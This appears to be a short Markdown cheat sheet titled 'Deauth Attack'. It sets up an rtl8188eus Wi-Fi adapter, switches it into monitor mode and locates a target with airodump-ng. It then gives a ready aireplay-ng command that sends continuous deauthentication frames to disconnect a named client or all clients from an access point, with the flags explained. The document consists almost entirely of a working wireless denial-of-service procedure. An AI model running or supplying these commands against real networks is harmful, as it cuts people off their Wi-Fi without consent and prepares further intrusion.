# Deauth Attack


## Commands used to setup the adapter
```
sudo apt update
sudo apt install bc
sudo rmmod r8188eu.ko
git clone https://github.com/aircrack-ng/rtl8188eus
cd rtl8188eus
sudo -i
echo "blacklist r8188eu" > "/etc/modprobe.d/realtek.conf"
exit
make
sudo make install
sudo modprobe 8188eu
```

## Commands to enable monitor mode after setting up
```
ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
iwconfig
```

## Actions
```
airmon-ng
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -d "target's BSSID" -c "target's channel number" "wireless adapter monitor mode name"
airodump-ng -d 50:C7:BF:DC:4C:E8 -c 11 wlan0mon
aireplay-ng -0 0 -a 50:C7:BF:DC:4C:E8 -c E0:B5:2D:EA:18:A7 wlan0mon
```
#### * Aireplay command description
```
-0 means deauthentication.
 0 is the number of deauths to send 0 means send them continuously, you can send 10 if you want the target to disconnect and reconnect.
-a 50:C7:BF:DC:4C:E8 is the MAC address of the access point we are targeting.
-c E0:B5:2D:EA:18:A7 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated.
wlan0mon is the interface name.
```

## After using
```
service NetworkManager restart
```
